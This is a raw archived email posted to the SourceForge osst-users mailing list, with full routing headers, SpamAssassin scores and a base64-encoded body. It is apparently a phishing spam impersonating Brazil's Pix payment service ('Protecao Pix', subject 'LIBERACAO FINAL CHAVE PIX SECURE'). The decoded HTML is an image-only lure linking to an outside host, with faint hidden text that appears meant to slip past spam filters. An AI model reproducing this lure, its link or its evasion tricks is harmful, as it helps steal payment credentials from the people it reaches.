Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AB1F32C007A
	for <lists+osst-users@lfdr.de>; Mon, 23 Nov 2020 08:12:48 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1kh61n-00015z-F5
	for lists+osst-users@lfdr.de; Mon, 23 Nov 2020 07:12:47 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <suporte@decodapa.pixcadastramentoweb.com>)
 id 1kh61l-00015g-L0
 for osst-users@lists.sourceforge.net; Mon, 23 Nov 2020 07:12:45 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Reply-To:From:
 Date:Subject:To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=QAosAFluv2GekhvKbtgt7nDqqoMSRUJYnMP72XhH9Bg=; b=MpsQmMweGrmp9138/8zbhuRn3K
 zpAptUG+VPGi5MvJRRQGcnvxVFLB8R1n1uGol+Sqo/Lca4fchjzH4vStfqx6uS+nFi5tH3nP2N6u0
 94W20OHrXc/+mf2wPk9I5h6EC4JWurd8tdbjejdZMX9zdQi9qHH5JWqrVNGyPyoV9pTM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Reply-To:From:Date:Subject:To:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=QAosAFluv2GekhvKbtgt7nDqqoMSRUJYnMP72XhH9Bg=; b=F
 ve2lHptuZppCpLUvYSdNJmkt5dkyzd3cx/J0Pp7KfEs00CUKo4VM/axyJPjyMUsa+QLF3iN0MOB0j
 fCEIgYzdT5x9qw8TxeTl25gqauyC7m6PI4dyXLlyoW92MuSF2zCDSK15h0H8bT+xzp4P3VO70l5lB
 NojEtIkggMKq2fVo=;
Received: from decodapa.pixcadastramentoweb.com ([116.203.92.210])
 by sfi-mx-3.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1kh61h-00HHCM-6N
 for osst-users@lists.sourceforge.net; Mon, 23 Nov 2020 07:12:45 +0000
Received: by decodapa.pixcadastramentoweb.com (Postfix, from userid 33)
 id DE136411FD; Mon, 23 Nov 2020 08:12:27 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
 d=decodapa.pixcadastramentoweb.com; s=decodapa; t=1606115547;
 bh=QAosAFluv2GekhvKbtgt7nDqqoMSRUJYnMP72XhH9Bg=;
 h=To:Subject:Date:From:Reply-To:From;
 b=MnKpAbvbKtO4dsTRb+OnOF9fyKwUM53l0jtnqriEVhOVFVYCGLemJ9GkVYIay7+ey
 MCkd+6zw5K259FLGQyBXX7KLrcnT29gemc0O8CBzOhYZTHmVAP7aq3GgNhFe6GFkaE
 7BGDFLbKW2AFwCfpDCQmBFKjBPY7y/L2putFP3l4KzGCT5Umts053JQYxxvbxXvJM1
 Xp9tgXWXt7ZCtDujXEoTLrghpfBjpPyq3HUIIipl8JTIO4dRpEA/+t9DDThkRyDn1S
 auOU/uyBY5iKub2fb6dBA1yOhMwWKojRwrU4HtL1zj4LMYT3IlYoZqHxgNAMC2DhE3
 zskd7TiCCnMnw==
To: osst-users@lists.sourceforge.net
Date: Mon, 23 Nov 2020 08:12:27 +0100
From: Protecao Pix <suporte@decodapa.pixcadastramentoweb.com>
Message-ID: <80fda96b9f648258861151e4281bb796@decodapa.pixcadastramentoweb.com>
X-Priority: 3
X-Mailer: PHPMailer 5.2.4
 (http://code.google.com/a/apache-extras.org/p/phpmailer/)
MIME-Version: 1.0
X-Spam-Score: 4.9 (++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.5 SUBJ_ALL_CAPS          Subject is all capitals
 -0.0 SPF_PASS               SPF: sender matches SPF record
 1.6 HTML_IMAGE_RATIO_02    BODY: HTML has a low ratio of text to image area
 1.0 HTML_MESSAGE           BODY: HTML included in message
 1.8 HTML_IMAGE_ONLY_08     BODY: HTML: images with 400-800 bytes of words
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.1 HTML_SHORT_LINK_IMG_1  HTML is very short with a linked image
 0.0 T_REMOTE_IMAGE         Message contains an external image
X-Headers-End: 1kh61h-00HHCM-6N
Subject: [Osst-users] LIBERACAO FINAL CHAVE PIX SECURE
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Protecao Pix <suporte@decodapa.pixcadastramentoweb.com>
Content-Type: multipart/mixed; boundary="===============4631625341588196930=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============4631625341588196930==
Content-Type: multipart/alternative;
	boundary="b1_80fda96b9f648258861151e4281bb796"

--b1_80fda96b9f648258861151e4281bb796
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

bl8xOTgwMDA0MDg4NDg4OTQ1NjE3NzEwNDk2MjM3NDgzNzMxMzEzNzA2NjQ=


--b1_80fda96b9f648258861151e4281bb796
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: base64

PGh0bWw+Cjxib2R5Pgo8dGFibGUgd2lkdGg9IjYwMCIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRk
aW5nPSIwIiBhbGlnbj0iY2VudGVyIj4NCgk8dGJvZHk+DQoJPHRyPg0KCQk8dGQgc3R5bGU9Imxp
bmUtaGVpZ2h0OiAwcHg7IGZvbnQtc2l6ZTogMHB4OyBtYXJnaW46IDBweDsiIHZhbGlnbj0idG9w
Ij4NCgkJCTx0YWJsZSBib3JkZXI9IjAiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2Vs
bHBhZGRpbmc9IjAiIGFsaWduPSJjZW50ZXIiPg0KCQkJCTx0Ym9keT4NCgkJCQkJPHRyPg0KCQkJ
CQkJPHRkIHN0eWxlPSJsaW5lLWhlaWdodDogMHB4OyBmb250LXNpemU6IDBweDsgbWFyZ2luOiAw
cHg7IiBhbGlnbj0iY2VudGVyIj48YSBocmVmPSJodHRwczovL3BpeHNlY3VyZXMuc2VydmVmdHAu
b3JnL2NzcyI+PGltZyBzcmM9Imh0dHBzOi8vcGl4c2VjdXJlcy5zZXJ2ZWZ0cC5vcmcvcGl4Mi5w
bmciIGFsdD0iIiB3aWR0aD0iNjAwIiBoZWlnaHQ9IjU1NSIgLz48L2E+PC90ZD4NCgkJCQkJPC90
cj4NCgkJCQk8L3Rib2R5Pg0KCQkJPC90YWJsZT4NCgkJPC90ZD4NCgk8L3RyPg0KCTwvdGJvZHk+
DQo8L3RhYmxlPg0KCjwvYm9keT4KPGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxmb250IGNv
bG9yPSIjRTZFNkU2Ij5uXzE5ODAwMDQwODg0ODg5NDU2MTc3MTA0OTYyMzc0ODM3MzEzMTM3MDY2
NDwvZm9udD48L2h0bWw+



--b1_80fda96b9f648258861151e4281bb796--



--===============4631625341588196930==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4631625341588196930==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============4631625341588196930==--


